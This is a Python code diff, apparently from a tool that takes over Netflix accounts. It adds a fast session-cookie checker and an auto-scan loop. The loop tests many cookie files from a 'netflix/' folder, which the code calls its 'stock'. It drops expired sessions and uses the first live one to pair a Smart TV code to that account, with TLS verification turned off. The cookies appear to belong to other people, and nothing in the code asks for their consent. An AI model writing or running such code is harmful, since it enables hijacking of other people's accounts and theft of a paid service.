@@ -546,6 +546,30 @@ def set_cookies_on_session(session, cookies: Dict[str, str]):
     for name, value in cookies.items():
         session.cookies.set(name, value, domain=".netflix.com", path="/")
 
+def check_cookie_session_fast(parsed_cookies: dict, timeout: float = 2.5) -> Tuple[bool, Optional[requests.Session]]:
+    """Testa em ~200ms se a sessão do cookie é válida contra /tv2 com allow_redirects=False."""
+    if not parsed_cookies or not any(parsed_cookies.get(k) for k in ["NetflixId", "SecureNetflixId"]):
+        return False, None
+    s = get_session()
+    set_cookies_on_session(s, parsed_cookies)
+    try:
+        r = s.get('https://www.netflix.com/tv2', timeout=timeout, allow_redirects=False, verify=False)
+        # Se redirecionar para tela de login ou signin -> sessão morta
+        if r.status_code in (301, 302, 303, 307):
+            loc = r.headers.get('Location', '').lower()
+            if '/login' in loc or '/signin' in loc or 'entryurl' in loc:
+                return False, None
+            if '/tv2' in loc or '/browse' in loc or '/youraccount' in loc:
+                return True, s
+        # Se retornar 200 OK sem ser página de login -> sessão ativa
+        if r.status_code == 200:
+            url_low = getattr(r, 'url', '').lower()
+            if '/login' not in url_low and '/signin' not in url_low:
+                return True, s
+    except Exception:
+        pass
+    return False, None
+
 def extract_auth_url(session) -> Optional[str]:
     global ACTIVE_PROXY
     r = None
@@ -733,10 +757,23 @@ def _activate_tv_code_graphql(session, clean_code: str) -> Tuple[bool, str]:
     if not server_screen_update:
         server_screen_update = _find_val_recursive(ctx, 'requestScreenUpdate_serverScreenUpdate') or _find_val_recursive(ctx, 'serverScreenUpdate')
 
+    if not server_state:
+        m_ss = re.search(r'["\']serverState["\']\s*:\s*(?:\{[^}]*["\']value["\']\s*:\s*)?["\']([^"\']+)["\']', r.text)
+        if m_ss:
+            server_state = m_ss.group(1)
+
+    if not server_screen_update:
+        m_su = re.search(r'["\'](?:requestScreenUpdate_)?serverScreenUpdate["\']\s*:\s*(?:\{[^}]*["\']value["\']\s*:\s*)?["\']([^"\']+)["\']', r.text)
+        if m_su:
+            server_screen_update = m_su.group(1)
+
     if not server_state or not server_screen_update:
         return False, "no_clcs"
 
     query_id = "3b8d1a94-b412-4f69-bc9b-a51503757f9d"
+    m_qid = re.search(r'["\']persistedQuery["\']\s*:\s*\{[^}]*["\']id["\']\s*:\s*["\']([a-f0-9\-]{36})["\']', r.text)
+    if m_qid:
+        query_id = m_qid.group(1)
     query_ver = 102
 
     gql_payload = {
@@ -1156,7 +1193,7 @@ def mark_cookie_used(filename: str, email: str = ""):
 COOKIE_DT_CACHE = {}
 
 def get_cookie_file_dt(filepath: str) -> int:
-    """Extrai o timestamp 'dt' do SecureNetflixId para priorizar cookies gerados recentemente."""
+    """Extrai o timestamp 'dt' do SecureNetflixId ou data de modificação para priorizar cookies gerados recentemente."""
     bname = os.path.basename(filepath)
     if bname in COOKIE_DT_CACHE:
         return COOKIE_DT_CACHE[bname]
@@ -1166,8 +1203,16 @@ def get_cookie_file_dt(filepath: str) -> int:
         m = re.search(r'dt(?:%3D|=)(\d+)', raw, re.I)
         if m:
             dt = int(m.group(1))
+        else:
+            try:
+                dt = int(os.path.getmtime(filepath) * 1000)
+            except Exception:
+                dt = 0
     except Exception:
-        pass
+        try:
+            dt = int(os.path.getmtime(filepath) * 1000)
+        except Exception:
+            dt = 0
     COOKIE_DT_CACHE[bname] = dt
     return dt
 
@@ -1338,6 +1383,121 @@ def activate_with_cookie(cookie_data: dict, tv_code: str) -> Tuple[bool, str, Op
         DEAD_COOKIES.add(os.path.basename(filename))
         console.print(f"  [bold #FF0033]❌ Pareamento não concluído ({status_msg}). Alternando cookie...[/bold #FF0033]")
         return False, "A Netflix não concluiu o pareamento com este cookie. Próximo cookie carregado!", None
+
+def activate_tv_code_auto_scan(tv_code: str, max_candidates: int = 40, time_budget: float = 55.0, logger_cb = None) -> Tuple[bool, str, Optional[dict]]:
+    """
+    Varredura contínua e inteligente de cookies da Netflix:
+    Testa candidatos em loop ultra-rápido (~200ms por cookie inativo)
+    até encontrar um cookie ativo e parear a TV com sucesso.
+    """
+    clean_code = re.sub(r'[^A-Za-z0-9]', '', tv_code).upper()
+    if not clean_code or len(clean_code) < 6:
+        return False, "Código de Smart TV inválido. Digite os 8 dígitos exibidos na tela da TV.", None
+
+    def _log(text: str, lvl: str = "info"):
+        if logger_cb:
+            try:
+                logger_cb(text, lvl)
+            except Exception:
+                pass
+        console.print(f"  {text}")
+
+    _log(f"🔍 [Netflix] Iniciando busca automatizada para ativar Smart TV com código {clean_code}...")
+
+    # Se a lista de cookies mortos filtrou tudo, limpa para nova chance
+    all_files = get_available_cookie_files()
+    if not all_files:
+        DEAD_COOKIES.clear()
+        all_files = get_available_cookie_files()
+
+    candidates = get_randomized_cookie_candidates()
+    if not candidates:
+        DEAD_COOKIES.clear()
+        candidates = get_available_cookie_files()
+
+    if not candidates:
+        return False, "Nenhum arquivo de cookie encontrado na pasta 'netflix/'. Adicione novos cookies.", None
+
+    start_ts = time.time()
+    tested_count = 0
+    live_count = 0
+
+    for fpath in candidates:
+        if (time.time() - start_ts) > time_budget:
+            _log(f"⏱️ [Netflix] Limite de tempo de varredura atingido ({int(time_budget)}s).", "warn")
+            break
+
+        if tested_count >= max_candidates:
+            _log(f"🔄 [Netflix] Limite de {max_candidates} cookies testados na rodada atingido.", "warn")
+            break
+
+        bname = os.path.basename(fpath)
+        if fpath in DEAD_COOKIES or bname in DEAD_COOKIES:
+            continue
+
+        raw = read_secure_file(fpath)
+        if not raw:
+            DEAD_COOKIES.add(fpath)
+            DEAD_COOKIES.add(bname)
+            continue
+
+        parsed = load_cookies(raw)
+        if not parsed or not any(k in parsed for k in ["NetflixId", "SecureNetflixId"]):
+            DEAD_COOKIES.add(fpath)
+            DEAD_COOKIES.add(bname)
+            continue
+
+        tested_count += 1
+
+        # Teste instantâneo de sessão (150-250ms)
+        is_live, live_session = check_cookie_session_fast(parsed, timeout=2.5)
+        if not is_live or not live_session:
+            DEAD_COOKIES.add(fpath)
+            DEAD_COOKIES.add(bname)
+            continue
+
+        live_count += 1
+        acc_email = extract_email_from_cookie_name(bname) or f"Conta-{live_count}"
+        _log(f"🟢 [Netflix] Sessão ativa confirmada: {acc_email} ({bname})! Enviando pareamento para TV {clean_code}...", "info")
+
+        # Cookie vivo: executa pareamento na TV
+        success, status_msg = activate_tv_code(live_session, clean_code)
+
+        if success:
+            acc_info = check_account(parsed, timeout=3.0) or {
+                "email": acc_email,
+                "plan": "Netflix Premium 4K",
+                "video_quality": "Ultra HD 4K",
+                "country": "BR"
+            }
+            acc_info["file"] = fpath
+            mark_cookie_used(fpath, acc_info.get("email", ""))
+            _log(f"⚡ [Netflix] [SUCESSO] TV {clean_code} pareada e ativada com sucesso com a conta {acc_email}!", "success")
+            return True, "TV pareada e ativada com sucesso!", acc_info
+
+        # Se o código da TV na tela for inválido ou expirou, encerra na hora
+        if status_msg == "invalid_code":
+            _log(f"⚠️ [Netflix] Código '{clean_code}' foi recusado pela Netflix (inválido ou incorreto).", "warn")
+            return False, f"O código '{clean_code}' foi recusado pela Netflix. Verifique se o código na TV expirou ou foi digitado incorretamente.", None
+        elif status_msg == "expired_code":
+            _log(f"⚠️ [Netflix] Código '{clean_code}' expirou na tela da TV.", "warn")
+            return False, f"O código '{clean_code}' expirou na tela da Smart TV. Gere um novo código de 8 dígitos na TV e tente novamente.", None
+        elif status_msg == "already_used":
+            _log(f"⚠️ [Netflix] Código '{clean_code}' já foi utilizado na TV.", "warn")
+            return False, f"O código '{clean_code}' já foi utilizado anteriormente. Gere outro código na TV.", None
+        elif status_msg == "rate_limit":
+            _log(f"⚠️ [Netflix] Rate-limit temporário na Netflix.", "warn")
+            return False, "Muitas tentativas simultâneas na Netflix. Aguarde 2 minutos e tente novamente.", None
+
+        # Falha de pareamento com este cookie específico (ex: residência diferente ou bloqueio)
+        DEAD_COOKIES.add(fpath)
+        DEAD_COOKIES.add(bname)
+        _log(f"⚠️ [Netflix] Pareamento não concluído com {bname} ({status_msg}). Testando próximo cookie da fila...", "warn")
+
+    if live_count == 0:
+        return False, f"Foram testados {tested_count} cookies do estoque e todos estavam com a sessão expirada. Por favor, adicione novos cookies recentes na pasta netflix.", None
+
+    return False, f"Foram verificados {tested_count} cookies ({live_count} com sessão ativa), mas a Netflix não concluiu o vínculo do código '{clean_code}'. Gere um novo código de 8 dígitos na TV e tente novamente.", None
 
 def run_activation_cycle():
     clear_screen()
